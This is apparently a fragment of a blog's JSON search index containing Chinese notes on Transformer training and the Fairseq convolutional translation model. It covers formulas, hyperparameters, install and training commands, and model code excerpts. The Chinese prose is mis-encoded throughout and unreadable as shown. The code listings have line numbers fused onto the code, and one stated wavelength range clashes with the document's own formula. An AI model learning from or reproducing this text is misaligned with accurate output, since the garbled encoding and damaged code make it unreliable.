decoderæœ¬èº«ä¹Ÿä¼šç±»ä¼¼encoderä¸€æ ·å»åšself attentionï¼Œä¸åŒçš„æ˜¯ï¼Œdecoderåªå¯¹å·¦è¾¹å·²ç»ç”Ÿæˆçš„åºåˆ—è¿›è¡Œattentionï¼Œå¯¹è¿˜æ²¡æœ‰ç”Ÿæˆçš„ï¼ˆå³è¾¹çš„ï¼‰åºåˆ—æ©ç›–ï¼ˆmaskingï¼‰ å®Œæ•´çš„æ¨¡å‹å›¾ 1.5 åŸºäºä½ç½®çš„å‰å‘ç¥ç»ç½‘ç»œï¼ˆPosition-wise Feed-Forward Networksï¼‰ å¯¹äºencoderå’Œdecoderçš„æ¯ä¸ªattentionå±‚ä¹‹åï¼Œè¿˜ä¼šåœ¨è¿æ¥ä¸€ä¸ªå…¨è¿æ¥çš„å‰å‘ç¥ç»ç½‘ç»œã€‚è¿™ä¸ªç½‘ç»œåŒ…å«äº†ä¸¤ä¸ªçº¿æ€§è½¬æ¢å’Œä¸­é—´åŠ ä¸€ä¸ªReLUçš„æ¿€æ´»å‡½æ•° \\[FFN(x) =\\max(0, xW_1+b_1) W_2+b_2\\] è¿™é‡Œæ¯ä¸€å±‚ï¼Œéƒ½ç”¨ä¸åŒçš„\\(W_1,W_2,b_1,b_2\\)ã€‚ 1.6 è¯å‘é‡çŸ©é˜µåŠSoftmaxå±‚ è¿™é‡Œä½¿ç”¨å¸¸è§çš„è¯å‘é‡çŸ©é˜µï¼Œå¹¶encoderä¼šæŠŠè¯å‘é‡æ˜ å°„åˆ°\\(d_\\text{model}\\)ç©ºé—´ä¸Šï¼Œä½œä¸ºç¬¬ä¸€å±‚çš„è¾“å…¥ åœ¨åšé¢„æµ‹çš„æ—¶å€™ï¼Œä¼šå°†è¾“å‡ºå‘é‡æ˜ å°„åˆ°ä¸€ä¸ªè¯è¡¨å¤§å°çš„æ¦‚ç‡ç©ºé—´ä¸­ï¼Œå¹¶ä½¿ç”¨softmaxæ¥å½’ä¸€åŒ–åˆ°ä¸€ä¸ª\\([0,1]\\)ä¹‹é—´çš„æ¦‚ç‡å€¼ã€‚ 1.7 ä½ç½®ç¼–ç ï¼ˆposition embeddingsï¼‰ å› ä¸ºæ¨¡å‹æ²¡æœ‰recurrenceåŠconvolutionçš„æ“ä½œï¼Œæ‰€ä»¥ä¸ºäº†è®©æ¨¡å‹èƒ½å¤Ÿåˆ†è¾¨ä¸åŒä½ç½®çš„å•è¯ï¼Œéœ€è¦å¯¹å•è¯çš„ä½ç½®è¿›è¡Œç¼–ç ã€‚ â€‹ \\[PE(pos, 2i)=\\sin(pos/10000^{2i/d_\\text{model}}) \\\\ PE(pos, 2i+1)=\\cos(pos/10000^{2i/d_\\text{model}})\\] posæ˜¯è¿™ä¸ªå•è¯åœ¨å¥å­ä¸­çš„ä½ç½®ï¼Œiæ˜¯è¿™ä¸ªä½ç½®å‘é‡çš„ç¬¬iä¸ªç»´åº¦çš„ç¼–å·ã€‚è¿™æ ·çš„æ³¢é•¿å½¢æˆäº†ä¸€ä¸ªä»\\(2\\pi\\)åˆ°\\(1000\\cdot 2\\pi\\)çš„å‡ ä½•çº§æ•°ã€‚è¿™æ ·ä¼šä½¿å¾—æ¨¡å‹æ›´å®¹æ˜“å­¦åˆ°ç›¸å¯¹è·ç¦»ï¼Œå› ä¸º\\(PE_{pos+k}\\)å¯ä»¥è¡¨ç¤ºä¸º\\(PE_{pos}\\)çš„ä¸€ä¸ªçº¿æ€§å˜åŒ–ã€‚ 1.8 Transformer å¯¹æ¯”RNNåŠCNN å‘ç°RNNéœ€è¦è¿›è¡Œ\\(O(n)\\)ä¸ªåºåˆ—æ“ä½œï¼Œè€ŒTransformerå’ŒCNNåªéœ€è¦\\(O(1)\\)ä¸ª CNNä¼šå½¢æˆä¸€ä¸ªå±‚çº§ç»“æ„ï¼Œç±»ä¼¼æ ‘çŠ¶ï¼Œæ‰€ä»¥ä»»æ„ä¸¤ä¸ªå•è¯åˆ°è¾¾çš„æœ€å¤§è·¯å¾„é•¿åº¦æ˜¯\\(O(\\log_k(n))\\) å¦‚æœself-attentionåªå¯¹è¯¥å•è¯å‘¨å›´rä¸ªå•è¯è¿›è¡Œattentionæ“ä½œï¼Œå¯ä»¥å¾—åˆ°restrictedç‰ˆæœ¬çš„self-attentionï¼Œ è¿™æ ·å¯ä»¥å‡å°‘æ¯ä¸€å±‚çš„è®¡ç®—å¤æ‚åº¦ï¼Œä½†æœªå¢åŠ ä¸¤ä¸ªä»»æ„è¯ä¹‹é—´åˆ°è¾¾çš„æœ€é•¿è·¯å¾„ã€‚ 2. Transformeræ¨¡å‹çš„è®­ç»ƒç»†èŠ‚ ä¼˜åŒ–æ–¹æ³• æ­£åˆ™åŒ– ï¼ˆregularizationï¼‰ label smoothing 2.1 ä¼˜åŒ–æ–¹æ³• Adam ä¼˜åŒ–æ–¹æ³•ï¼Œ\\(\\beta_1=0.9, \\beta_2=0.98, \\epsilon=10^{-9}\\) learning rateæ˜¯éšç€è®­ç»ƒçš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡ä»¥ä¸‹ä¸€ä¸ªå‡½æ•°è¿›è¡Œå˜åŒ–ã€‚ä¸€å¼€å§‹åœ¨å‰ warmup_stepsä¸ªè®­ç»ƒè¿­ä»£ä¸­learning rateæ˜¯çº¿æ€§å¢é•¿çš„ï¼Œå¾€åéšç€æ­¥é•¿çš„å¢åŠ è€Œä¸‹é™ã€‚ ä¸€èˆ¬ä¼šè®¾ç½® warmup_steps = 4000 \\[lr = d_\\text{model}^{-0.5} \\cdot \\min(\\text{step_num}^{-0.5},\\text{step_num}\\cdot \\text{warmup_steps}^{-1.5}) \\] 2.2 æ­£åˆ™åŒ– Regularization å¯¹æ¯ä¸€ä¸ªå­å±‚çš„è¾“å‡ºï¼Œåœ¨è¯¥å­å±‚çš„è¾“å‡ºåŠ ä¸Šè¯¥å­å±‚çš„è¾“å…¥ä¹‹å‰è¿›è¡Œdropout å¯¹encoderåŠdecoderï¼Œè¯å‘é‡å’Œä½ç½®å‘é‡æ±‚å’Œä¹‹åéƒ½è¿›è¡Œdropout 2.3 Label Smoothing å¯¹äºæ­£ç¡®çš„æ ‡æ³¨labelï¼Œåœ¨å…¶one-hotè¡¨è¾¾ä¸Šï¼ŒåŠ ä¸Šä¸€ä¸ªå‡åŒ€åˆ†å¸ƒçš„å‘é‡ï¼Œè¿™ä¸ªsmoothingçš„æ•°å€¼æ˜¯\\(\\epsilon_{ls}=0.1\\) 3 Tranformer Code TensorFlow transformer å®˜æ–¹ä»£ç  ä½œè€…ä»£ç  å“ˆä½›NLPç»„pytorchå®ç°","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"transformer","slug":"transformer","permalink":"https://racleray.github.io/tags/transformer/"}]},{"title":"Fairseq Notes","slug":"Fairseq-Notes","date":"2020-07-07T09:01:06.000Z","updated":"2023-08-07T11:54:31.029Z","comments":true,"path":"posts/62a02478.html","link":"","permalink":"https://racleray.github.io/posts/62a02478.html","excerpt":"åœ¨è‡ªç„¶è¯­è¨€å¤„ç†ä¸­ï¼Œå¤§éƒ¨åˆ†æµè¡Œçš„seq2seqæ¨¡å‹éƒ½æ˜¯åŸºäºRNNç»“æ„å»æ„å»ºencoderå’Œdecoderï¼Œä½¿å¾—å¹¶è¡ŒåŒ–æ“ä½œéš¾ä»¥å……åˆ†è¿›è¡Œï¼Œéš¾ä»¥å‘æŒ¥å®Œå…¨å‘æŒ¥GPUå¹¶è¡Œçš„æ•ˆç‡ã€‚è€ŒFairseqæ˜¯ä¸€ç§ä»¥CNNä¸ºåŸºç¡€çš„æ¨¡å‹ã€‚","text":"1.åŸºäºCNNçš„ç¿»è¯‘ç³»ç»Ÿæ¨¡å‹ç»“æ„ â€‹ åœ¨è‡ªç„¶è¯­è¨€å¤„ç†ä¸­ï¼Œå¤§éƒ¨åˆ†æµè¡Œçš„seq2seqæ¨¡å‹éƒ½æ˜¯åŸºäºRNNç»“æ„å»æ„å»ºencoderå’Œdecoderï¼Œä½†æ˜¯RNNå¯¹äºä¸‹ä¸€ä¸ªçŠ¶æ€çš„é¢„æµ‹éœ€è¦ä¾èµ–å‰é¢çš„æ‰€æœ‰å†å²çŠ¶æ€ï¼Œä½¿å¾—å¹¶è¡ŒåŒ–æ“ä½œéš¾ä»¥å……åˆ†è¿›è¡Œï¼Œéš¾ä»¥å‘æŒ¥å®Œå…¨å‘æŒ¥GPUå¹¶è¡Œçš„æ•ˆç‡ã€‚ç›¸åCNNé€šè¿‡åœ¨å›ºå®šçª—å£å†…çš„è®¡ç®—ï¼Œä½¿å¾—è®¡ç®—çš„å¹¶è¡ŒåŒ–å˜å¾—æ›´åŠ ç®€å•ï¼Œè€Œä¸”é€šè¿‡å¤šå±‚CNNç½‘ç»œå¯ä»¥æ„å»ºå±‚çº§ç»“æ„(hierarchical structure)ï¼Œå¯ä»¥è¾¾åˆ°åˆ©ç”¨æ›´çŸ­çš„è·¯å¾„å»è¦†ç›–æ›´é•¿èŒƒå›´å†…çš„ä¿¡æ¯ã€‚ â€‹ Facebookæå‡ºäº†åŸºäºCNNçš„æœºå™¨ç¿»è¯‘æ¨¡å‹ï¼Œå¹¶å¼€æºäº†CNNçš„æœºå™¨ç¿»è¯‘å·¥å…·Fairseq 1.1 Pooling Encoder â€‹ æœ€ç®€å•çš„non-recurrent encoderå°±æ˜¯æŠŠkä¸ªè¿ç»­çš„å•è¯çš„è¯å‘é‡æ±‚å¹³å‡å€¼ï¼Œé€šè¿‡åœ¨å¥å­å·¦å³ä¸¤è¾¹éƒ½æ·»åŠ é¢å¤–çš„ç©ºå•è¯(paddings)ï¼Œå¯ä»¥ä½¿å¾—encoderè¾“å‡ºè·ŸåŸæ¥å¥å­åŒç­‰é•¿åº¦çš„hidden embeddingsã€‚ å‡è®¾åŸæ¥çš„å¥å­çš„è¯å‘é‡ï¼ˆword embeddingï¼‰è¡¨ç¤ºä¸º \\(w=[w_1,\\cdots,w_m],~\\forall~w_j\\in R^f\\) absolute position embeddingsç”¨äºç¼–ç ä½ç½®ä¿¡æ¯ \\(p=[p_1,\\cdots,p_m],~\\forall~p_j\\in R^f\\) \\[e_j = w_j + p_j,~~ z_j = {1\\over k} \\sum_{t=-k/2}^{k/2}e_{j+t} \\] ä¼ ç»Ÿçš„attentionæœºåˆ¶ \\[ c_i = \\sum_{j=1}^m a_{ij} e_j\\] 1.2 å·ç§¯ç¼–ç å™¨Convolutional Encoder NMT â€‹ å·ç§¯ç¼–ç å™¨åœ¨pooling encoderçš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹è¿›ï¼Œä½¿ç”¨ä¸€ä¸ªCNN-a å·ç§¯å±‚æ¥è¿›ä¸€æ­¥ç¼–ç æºè¯­è¨€å¥å­ä¸­çš„è¯ã€‚è¾“å‡ºåŸå¥é•¿åº¦çš„ç¬¬ä¸€å±‚å·ç§¯ç»“æœZã€‚ â€‹ \\[z_j = CNN\\_a(e)_j \\] â€‹ æ³¨æ„attentionçš„æ—¶å€™ï¼Œä½¿ç”¨äº†å¦ä¸€ä¸ªCNN-cå·ç§¯å±‚æ¥ç¼–ç æºè¯­è¨€å¥å­ä¸­çš„å•è¯ï¼Œè¿˜æ˜¯è¾“å‡ºåŸå¥é•¿åº¦çš„ç¬¬ä¸€å±‚å·ç§¯ç»“æœï¼Œä½œä¸ºè®¡ç®—atttention weightçš„encoder hidden statesã€‚ç„¶åè®¡ç®—atttention weightï¼Œå†è¿›è¡ŒåŠ æƒæ±‚å’Œã€‚ â€‹ \\[c_i = \\sum_{j=1}^m a_{ij} CNN\\_c(e)_j\\] â€‹ è¯¥æ¨¡å‹çš„encoder é‡‡ç”¨çš„æ˜¯CNNï¼Œä½†å…¶decoderè¿˜æ˜¯é‡‡ç”¨äº†ä¼ ç»Ÿçš„RNNæ¨¡å‹ 1.ï¼“ å…¨å·ç§¯ç¥ç»ç¿»è¯‘æ¨¡å‹ Convolutional NMT è¯¥æ¨¡å‹çš„encoderå’Œdecoderéƒ½é‡‡ç”¨çš„æ˜¯å·ç§¯æ ¸CNNï¼ŒåŠ¨å›¾æ¼”ç¤º å·ç§¯æ ¸ç»“æ„ å‡è®¾æœ‰1Dçš„å·ç§¯æ ¸çš„çª—å£å¤§å°æ˜¯k(æ¯”å¦‚k=5)ï¼Œæ¯ä¸ªå·ç§¯æ ¸éƒ½å¯ä»¥ç”¨ä¸€ä¸ªæƒé‡çŸ©é˜µ\\(W\\in \\mathbb{R}^{2d\\times kd}\\)å’Œ bias \\(b_w\\in \\mathbb{R}^{2d}\\)ã€‚å¯¹äºçª—å£å†…çš„è¯å‘é‡ \\(X\\in \\mathbb{R}^{k\\times d}\\)æŠŠæ‰€æœ‰å•è¯æ‹¼æ¥æˆä¸€ä¸ªé•¿å‘é‡ \\(X&#39;\\in \\mathbb{R}^{kd}\\). \\[Y=WX&#39;+b_w = [A B] \\in \\mathbb{R}^{2d} \\\\ A,B\\in \\mathbb{R}^{d} \\] æ¥ä¸‹æ¥é‡‡ç”¨Gated Linear Unites(GLU)çš„æ–¹å¼æ¥è¿›è¡Œç¼–ç , \\(\\sigma()\\)æ˜¯ä¸€ä¸ªéçº¿æ€§çš„æ¿€æ´»å‡½æ•°ï¼Œ \\(\\otimes\\)æ˜¯element-wise mulitiplication \\[v([A B] = A \\otimes \\sigma(B) \\in \\mathbb{R}^d\\] æ®‹å·®è¿æ¥ Residual Connection: æŠŠè¿™ä¸€å±‚çš„è¾“å…¥ä¹Ÿç´¯åŠ åˆ°ä¸‹ä¸€å±‚çš„è¾“å‡º \\[h_i^l = v(W^l [h_{(i-k)/2}^{l-1},\\cdots,h_{(i+k)/2}^{l-1}]+b_w^l)+h_i^{l-1} \\in \\mathbb{R}^d\\] ç¼–ç å™¨ Encoder: å‡è®¾åŸæ¥çš„å¥å­çš„è¯å‘é‡ï¼ˆword embeddingï¼‰è¡¨ç¤ºä¸º \\(w=[w_1,\\cdots,w_m],~\\forall~w_j\\in \\mathbb{R}^f\\) absolute position embeddingsç”¨äºç¼–ç ä½ç½®ä¿¡æ¯ \\(p=[p_1,\\cdots,p_m],~\\forall~p_j\\in \\mathbb{R}^f\\) \\[e_j = w_j + p_j \\\\ \\] encoder å…ˆç”¨ä¸€ä¸ªçº¿æ€§å‡½æ•°\\(f:\\mathbb{R}^f\\rightarrow \\mathbb{R}^d\\)ï¼ŒæŠŠè¯å‘é‡æ˜ å°„åˆ°dç»´ç©ºé—´ä¸­ æ¥ä¸‹æ¥encoderä¼šå°†è¯å‘é‡é€šè¿‡ä¸€å±‚å±‚å·ç§¯æ ¸ï¼Œå¾—åˆ°æ¯ä¸€å±‚çš„å•è¯çš„éšå¼è¡¨è¾¾ï¼ˆhidden stateï¼‰, å…¶ä¸­ \\(z_j^u\\) ä»£è¡¨çš„æ˜¯ç¬¬uå±‚CNNä¸­ç¬¬jä¸ªå•è¯çš„è¡¨è¾¾ Multi-step Attentionæœºåˆ¶ å‡è®¾å·²ç»ç¿»è¯‘çš„å•è¯çš„è¯è¡¨è¾¾æ˜¯ \\(g=[g_1,\\cdots, g_n]\\)ï¼Œè·Ÿæºè¯­è¨€çš„è¯è¡¨è¾¾ä¸€æ ·ï¼Œè¿™é‡Œä¹Ÿæ˜¯word embeddingsåŠ ä¸Špositional embeddings å‡è®¾decoderçš„å·ç§¯æ ¸çš„hidden state \\(h_i^l\\), å¯ä»¥è¿›ä¸€æ­¥è®¡ç®—decoderå·²ç»ç”Ÿæˆçš„å•è¯çš„æ¯ä¸€å±‚çš„å•è¯è¡¨è¾¾ \\[d_i^l = W_d^l h_i^l + b_d^l + g_i \\] å‡è®¾encoder æœ€é¡¶å±‚(å‡è®¾æ˜¯ç¬¬uå±‚)ä¸­ï¼Œæ¯ä¸ªå•è¯çš„è¡¨è¾¾æ˜¯\\(z_j^u\\)ã€‚å¯ä»¥è®¡ç®—decoderç¬¬lå±‚ä¸­ç¬¬iä¸ªå·²ç»ç”Ÿæˆçš„å•è¯\\(h_i^l\\)ä¸æºè¯­è¨€å¥å­ä¸­æœ€é¡¶å±‚ï¼ˆä¹Ÿå³æ˜¯ç¬¬uå±‚ï¼‰çš„ç¬¬jä¸ªå•è¯ \\(z_j^u\\)çš„æƒé‡: \\[a_{ij}^l = {\\exp(d_i^l \\cdot z_j^u) \\over \\sum_{t=1}^m \\exp(d_i^l \\cdot z_t^u) } \\] å¯ä»¥è¿›ä¸€æ­¥è®¡ç®—åœ¨decoderç¬¬lå±‚ï¼Œåœ¨ç¬¬iä¸ªæ—¶åˆ»çš„ä¸Šä¸‹æ–‡å‘é‡ï¼ˆä¹Ÿå³æ˜¯context vectorï¼‰å¦‚ä»¥ä¸‹å…¬å¼ï¼Œå…¶ä¸­å°†encoderæœ€é¡¶å±‚(ç¬¬uå±‚)çš„è¯å‘é‡\\(z_j^u\\)ä¸æœ€åº•å±‚çš„è¯å‘é‡\\(e_j\\)ç›¸åŠ ã€‚ â€‹ \\[c_i^l = \\sum_{j=1}^m a_{ij}^l (z_j^u + e_j) \\] å°†\\(c_i^l\\)åŠ åˆ°\\(h_i^l\\)ä¸­ï¼Œä½œä¸ºdecoder çš„ä¸‹ä¸€å±‚çš„è¾“å…¥ è§£ç å™¨ decoder æŠŠdecoderæœ€é¡¶å±‚çš„hidden state \\(h_i^L\\) é€šè¿‡ä¸€ä¸ªçº¿æ€§çš„å‡½æ•°æ˜ å°„åˆ°è¯è¡¨ç©ºé—´ä¸Š\\(d\\rightarrow |V|\\)ï¼Œä¹‹ååœ¨é€šè¿‡ä¸€ä¸ªsoftmaxå‡½æ•° å½’ä¸€åŒ–æˆä¸€ä¸ªæ¡ä»¶æ¦‚ç‡å‘é‡ï¼š \\[p(y_{i+1}|y_1,\\cdots, y_i, x)= softmax(W_o h_i^L + b_0) \\in \\mathbb{R}^{|V|} \\] æ¨¡å‹çš„ç»“æ„å›¾ 1.4 å…¨å·ç§¯ç¥ç»ç¿»è¯‘æ¨¡å‹å¯¹æ¯”RNNç¥ç»ç¿»è¯‘æ¨¡å‹ å…¨å·ç§¯ç¥ç»ç½‘ç»œä½¿ç”¨å±‚çº§ç»“æ„ï¼Œå¯ä»¥å……åˆ†åœ°å¹¶è¡ŒåŒ– å¯¹äºä¸€ä¸ªçª—å£å¤§å°ä¸º\\(k\\)çš„CNNï¼Œç¼–ç ä¸€ä¸ªç‰¹å¾å‘é‡å¯ä»¥æ€»ç»“ä¸€ä¸ªçª—å£ä¸ºnä¸ªå•è¯çš„ä¿¡æ¯ï¼Œåªéœ€è¦åš\\(O(n/k)\\)ä¸ªå·ç§¯æ ¸æ“ä½œã€‚å¯¹æ¯”RNNï¼ŒRNNç¼–ç ä¸€ä¸ªçª—å£ä¸ºnä¸ªå•è¯çš„ä¿¡æ¯ï¼Œéœ€è¦åš\\(O(n)\\)ä¸ªæ“ä½œï¼Œè·Ÿå¥å­çš„é•¿åº¦æˆæ­£æ¯” å¯¹äºä¸€ä¸ªCNNçš„è¾“å…¥ï¼Œéƒ½è¿›è¡Œäº†ç›¸åŒæ•°é‡çš„å·ç§¯æ“ä½œåŠéçº¿æ€§æ“ä½œã€‚å¯¹æ¯”RNNï¼Œç¬¬ä¸€ä¸ªè¾“å…¥çš„å•è¯è¿›è¡Œäº†nè¯éçº¿æ€§æ“ä½œï¼Œè€Œæœ€åä¸€ä¸ªè¾“å…¥çš„å•è¯åªè¿›è¡Œäº†ä¸€æ¬¡éçº¿æ€§æ“ä½œã€‚å¯¹äºæ¯ä¸ªè¾“å…¥éƒ½è¿›è¡Œç›¸åŒæ•°é‡çš„æ“ä½œä¼šæœ‰åˆ©äºè®­ç»ƒã€‚ è®­ç»ƒCNN NMTéœ€è¦éå¸¸å°å¿ƒåœ°è®¾ç½®å‚æ•°åŠè°ƒæ•´ç½‘ç»œä¸­æŸäº›å±‚çš„ç¼©æ”¾ã€‚ 2 ä½¿ç”¨CNNå®Œæˆç¥ç»æœºå™¨ç¿»è¯‘ç³»ç»Ÿçš„tricks â€‹ è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œéœ€è¦å°†ç½‘ç»œä¸­æŸäº›éƒ¨åˆ†è¿›è¡Œç¼©æ”¾(scaling)ï¼Œéœ€è¦å¯¹æƒé‡åˆå§‹åŒ–ï¼Œéœ€è¦å¯¹è¶…å‚æ•°è¿›è¡Œè®¾ç½® 2.1 ç¼©æ”¾æ“ä½œï¼ˆscalingï¼‰ å°†æ®‹å·®å±‚çš„è¾“å‡ºä¹˜ä»¥ \\(\\sqrt{0.5}\\)ï¼Œ è¿™æ ·ä¼šå‡å°ä¸€åŠçš„åå·®variance å¯¹äºattentionæœºåˆ¶äº§ç”Ÿçš„ä¸Šä¸‹æ–‡å‘é‡ \\(c_{ij}^l\\) ä¹˜ä»¥ä¸€ä¸ªç³»æ•° \\(m\\sqrt{1/m}\\), å…¶ä¸­mä¸ºæºè¯­è¨€å¥å­ä¸­å•è¯ä¸ªä¸ªæ•°ï¼Œè¿™æ ·åšçš„å¥½å¤„ä¹Ÿæ˜¯èƒ½å‡å°åå·®ã€‚ å¯¹äºCNN decoderæœ‰multiple atttentionçš„æƒ…å†µï¼Œå°†encoder æ¯ä¸€å±‚çš„gradientä¹˜ä»¥ä¸€ä¸ªç³»æ•°ï¼Œè¯¥ç³»æ•°æ˜¯ä½¿ç”¨çš„attentionçš„æ•°é‡ã€‚æ³¨æ„ï¼Œåªå¯¹encoderä¸­é™¤äº†æºè¯­è¨€å•è¯çš„è¯å‘é‡çŸ©é˜µä»¥å¤–çš„å‚æ•°ï¼Œæ”¾å¤§gradientï¼Œæºè¯­è¨€çš„è¯å‘é‡çŸ©é˜µçš„gradientä¸è¿›è¡Œæ”¾å¤§ã€‚åœ¨å®éªŒä¸­ï¼Œè¿™æ ·çš„æ“ä½œä¼šä½¿å¾—è®­ç»ƒèƒ½æ›´åŠ ç¨³å®šã€‚ 2.2 å‚æ•°åˆå§‹åŒ– æ‰€æœ‰çš„è¯å‘é‡çŸ©é˜µä»ä¸€ä¸ªä»¥ï¼ä¸ºä¸­å¿ƒï¼Œæ ‡å‡†å·®ä¸º0.1çš„é«˜æ–¯åˆ†å¸ƒä¸­éšæœºåˆå§‹åŒ– \\(\\mathcal{N}(0, \\sqrt{n_l})\\), å…¶ä¸­\\(n_l\\)ä¸ºè¾“å…¥åˆ°è¿™ä¸ªç¥ç»å…ƒçš„è¾“å…¥ä¸ªæ•°ï¼Œä¸€èˆ¬å¯ä»¥è®¾ç½®ä¸º0.1ã€‚è¿™æ ·èƒ½æœ‰åŠ©äºä¿æŒä¸€ä¸ªæ­£æ€åˆ†å¸ƒçš„åå·®ã€‚ è¿˜éœ€è¦å¯¹æ¯ä¸€å±‚çš„æ¿€æ´»å‡½æ•°è¾“å‡ºè¿›è¡Œæ­£è§„åŒ–(normalization)ï¼Œ æ¯”å¦‚æ®‹å·®è¿æ¥ä¸­ï¼Œæ¯ä¸€å±‚å±‚çš„è¾“å‡ºå‘é‡éœ€è¦å…ˆåšæ­£åˆ™åŒ–ï¼Œå†æŠŠè¿™ä¸€å±‚çš„è¾“å…¥åŠ åˆ°è¾“å‡ºçš„å‘é‡ä¸Šã€‚ å¯¹äºGLUï¼Œéœ€è¦å¯¹å…¶æƒé‡ \\(W\\)ä»ä¸€ä¸ªæ­£æ€åˆ†å¸ƒ\\(\\mathcal{N}(0, \\sqrt{4p\\over n_l})\\)ä¸­éšæœºæŠ½æ ·ï¼Œè€Œå…¶biasè®¾ç½®æˆï¼ å¯¹æ¯ä¸€å±‚ç½‘ç»œçš„è¾“å…¥å‘é‡éƒ½è¿›è¡Œdropoutå¤„ç† 2.3 è¶…å‚æ•°è®¾ç½® encoder å’Œdecoderéƒ½æ˜¯ç”¨512ç»´çš„hidden unitsï¼Œ512ç»´çš„word embeddings è®­ç»ƒçš„æ—¶å€™ä½¿ç”¨Nesterov's accelerated gradient çš„æ–¹æ³•è¿›è¡Œä¼˜åŒ–æ¨¡å‹ï¼Œmomentum è®¾ç½®æˆ0.99 å¦‚æœgradientçš„normè¶…è¿‡0.1å°±æŠŠgradient é‡æ–°å½’ä¸€åŒ–åˆ°0.1ä»¥å†…ã€‚ åˆå§‹çš„learning rateè®¾ç½®æˆ0.25ï¼Œå¦‚æœåœ¨æ¯æ¬¡è¿›è¡Œvaludationçš„æ—¶å€™devæ•°æ®é›†ä¸­çš„perplexityæ²¡æœ‰ä¸‹é™ï¼Œå°±å°†learning rateä¹˜ä»¥0.1, ä¸€ç›´æŒç»­åˆ°learning rate é™åˆ°\\(10^{-4}\\)ä»¥ä¸‹åœæ­¢è®­ç»ƒ mini-batchçš„å¤§å°è®¾ç½®æˆæ¯æ¬¡å¤„ç†64å¥åŒè¯­å¥å­ 3. Facebook CNN æœºå™¨ç¿»è¯‘ç³»ç»Ÿä»£ç è§£æ ç›¸åº”çš„ä»£ç å¯ä»¥åœ¨githubä¸Šæ‰¾åˆ° fairseq å®‰è£… 1234git clone https://github.com/pytorch/fairseq.gitcd fairseqpip install -r requirements.txtpython setup.py build develop https://fairseq.readthedocs.io/en/latest/command_line_tools.html 3.1 Code 12345678910111213141516171819202122232425# é¢„å¤„ç†æ•°æ®$ bash prepare-wmt14en2de.sh --icml17$ cd examples/translation/$ bash prepare-wmt14en2de.sh$ cd ../..# å°†æ•°æ®å¤„ç†æˆäºŒè¿›åˆ¶å½¢å¼ï¼ŒåŠ é€Ÿè¯»å†™$ TEXT=examples/translation/wmt14_en_de$ python preprocess.py --source-lang en --target-lang de \\ --trainpref $TEXT/train --validpref $TEXT/valid --testpref $TEXT/test \\ --destdir data-bin/wmt14_en_de --thresholdtgt 0 --thresholdsrc 0# è®­ç»ƒæ¨¡å‹# å¦‚æœæ˜¾å­˜ä¸è¶³ï¼Œå¯ä»¥å°†--max-tokensè®¾ç½®æˆ1500$ mkdir -p checkpoints/fconv_wmt_en_de$ python train.py data-bin/wmt14_en_de \\ --lr 0.5 --clip-norm 0.1 --dropout 0.2 --max-tokens 4000 \\ --criterion label_smoothed_cross_entropy --label-smoothing 0.1 \\ --lr-scheduler fixed --force-anneal 50 \\ --arch fconv_wmt_en_de --save-dir checkpoints/fconv_wmt_en_de# æµ‹è¯•ï¼Œç”Ÿæˆ$ python generate.py data-bin/wmt14_en_de \\ --path checkpoints/fconv_wmt_en_de/checkpoint_best.pt --beam 5 --remove-bpe 3.2 ä½¿ç”¨é¢„è®­ç»ƒå¥½çš„æ¨¡å‹ 123456789101112131415# ä¸‹è½½æ¨¡å‹åŠæµ‹è¯•æ•°æ®$ mkdir -p data-bin$ curl https://dl.fbaipublicfiles.com/fairseq/models/wmt14.v2.en-fr.fconv-py.tar.bz2 | tar xvjf - -C data-bin$ curl https://dl.fbaipublicfiles.com/fairseq/data/wmt14.v2.en-fr.newstest2014.tar.bz2 | tar xvjf - -C data-bin# è¿›è¡Œç¿»è¯‘ç”Ÿæˆ$ python generate.py data-bin/wmt14.en-fr.newstest2014 \\ --path data-bin/wmt14.en-fr.fconv-py/model.pt \\ --beam 5 --batch-size 128 --remove-bpe | tee /tmp/gen.out# å¯¹ç¿»è¯‘ç»“æœæ‰“åˆ†$ grep ^H /tmp/gen.out | cut -f3- &gt; /tmp/gen.out.sys$ grep ^T /tmp/gen.out | cut -f2- &gt; /tmp/gen.out.ref$ python score.py --sys /tmp/gen.out.sys --ref /tmp/gen.out.ref 3.3 Notes CNN NMTç±» FConvModel 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@register_model('fconv')class FConvModel(FairseqModel): \"\"\" Args: encoder (FConvEncoder): the encoder decoder (FConvDecoder): the decoder \"\"\" def __init__(self, encoder, decoder): ... @staticmethod def add_args(parser): parser.add_argument('--dropout', type=float, metavar='D', help='dropout probability') parser.add_argument('--encoder-embed-dim', type=int, metavar='N', help='encoder embedding dimension') parser.add_argument('--encoder-embed-path', type=str, metavar='STR', help='path to pre-trained encoder embedding') parser.add_argument('--encoder-layers', type=str, metavar='EXPR', help='encoder layers [(dim, kernel_size), ...]') parser.add_argument('--decoder-embed-dim', type=int, metavar='N', help='decoder embedding dimension') parser.add_argument('--decoder-embed-path', type=str, metavar='STR', help='path to pre-trained decoder embedding') parser.add_argument('--decoder-layers', type=str, metavar='EXPR', help='decoder layers [(dim, kernel_size), ...]') parser.add_argument('--decoder-out-embed-dim', type=int, metavar='N', help='decoder output embedding dimension') @classmethod def build_model(cls, args, task): base_architecture(args) ... encoder = FConvEncoder( dictionary=task.source_dictionary, embed_dim=args.encoder_embed_dim, embed_dict=encoder_embed_dict, convolutions=eval(args.encoder_layers), dropout=args.dropout, max_positions=args.max_source_positions, ) decoder = FConvDecoder( dictionary=task.target_dictionary, embed_dim=args.decoder_embed_dim, embed_dict=decoder_embed_dict, convolutions=eval(args.decoder_layers), out_embed_dim=args.decoder_out_embed_dim, attention=eval(args.decoder_attention), dropout=args.dropout, max_positions=args.max_target_positions, share_embed=args.share_input_output_embed, ) return FConvModel(encoder, decoder) CNN encoderç±» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110class FConvEncoder(FairseqEncoder): def __init__( self, dictionary, embed_dim=512, embed_dict=None, max_positions=1024, convolutions=((512, 3),) * 20, dropout=0.1, left_pad=True, ): ... # å®šä¹‰è¯å‘é‡çŸ©é˜µåŠä½ç½®çŸ©é˜µ self.embed_tokens = Embedding(num_embeddings, embed_dim, self.padding_idx) self.embed_positions = PositionalEmbedding( 